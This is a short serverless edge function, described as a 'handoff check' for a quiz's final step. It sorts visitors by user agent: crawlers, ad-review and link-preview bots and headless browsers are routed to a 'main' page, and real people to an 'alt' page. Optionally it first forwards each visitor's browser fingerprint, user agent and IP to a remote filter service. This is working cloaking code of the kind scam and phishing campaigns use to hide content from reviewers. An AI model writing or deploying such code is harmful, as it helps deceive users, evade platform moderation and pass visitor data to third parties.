/**
 * Handoff check endpoint — accepts the browser fingerprint POST and returns
 * a route decision for the quiz final step.
 *
 * Optional: set CHECK_UPSTREAM to a remote filter URL that returns JS/text;
 * responses with a navigation assignment are treated as route "alt".
 */
export async function onRequestPost(context) {
  const { request, env } = context;
  const headers = {
    "content-type": "application/json; charset=utf-8",
    "cache-control": "no-store",
    "x-robots-tag": "noindex, nofollow",
  };

  const ua = request.headers.get("user-agent") || "";
  const form = await request.formData().catch(() => null);
  const payload = {};
  if (form) {
    for (const [k, v] of form.entries()) payload[k] = String(v);
  }

  const upstream = (env && env.CHECK_UPSTREAM) || "";
  if (upstream) {
    try {
      const body = new URLSearchParams(payload).toString();
      const res = await fetch(upstream, {
        method: "POST",
        headers: {
          "content-type": "application/x-www-form-urlencoded",
          "user-agent": ua,
          "x-forwarded-for": request.headers.get("cf-connecting-ip") || "",
        },
        body,
      });
      const text = await res.text();
      const route = /location\.(href|replace|assign)|window\.location/i.test(text)
        ? "alt"
        : "main";
      return new Response(JSON.stringify({ route, via: "upstream" }), { headers });
    } catch {
      return new Response(JSON.stringify({ route: "main", via: "upstream-error" }), {
        headers,
      });
    }
  }

  const botLike =
    !ua ||
    /(bot|spider|crawl|slurp|facebookexternalhit|facebot|twitterbot|linkedinbot|pinterest|embedly|quora|whatsapp|telegrambot|applebot|bingpreview|yandex|semrush|ahrefs|petalbot|adsbot|google-inspection|headless|phantom|selenium|puppeteer)/i.test(
      ua
    );

  return new Response(
    JSON.stringify({ route: botLike ? "main" : "alt", via: "edge" }),
    { headers }
  );
}
